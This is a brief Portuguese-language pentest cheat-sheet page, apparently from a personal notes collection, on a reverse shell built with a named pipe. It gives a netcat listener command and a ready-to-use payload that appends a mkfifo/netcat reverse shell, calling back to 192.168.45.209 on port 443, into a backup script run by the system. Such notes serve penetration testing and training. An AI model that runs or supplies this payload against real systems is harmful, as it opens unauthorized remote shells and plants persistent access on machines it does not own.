---
title: "Reverse Shell (mkfifo)"
---

# Reverse Shell (mkfifo)

Reverse shell via named pipe com `mkfifo`, útil em ambientes sem bash interativo. Cria um pipe nomeado em `/tmp/f` para redirecionar stdin/stdout através do netcat.

```shell
# Listener
rlwrap nc -vnlp 443

# Payload — injetar no alvo (ex: arquivo de backup executado pelo sistema)
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.209 443 >/tmp/f" >> user_backups.sh
```
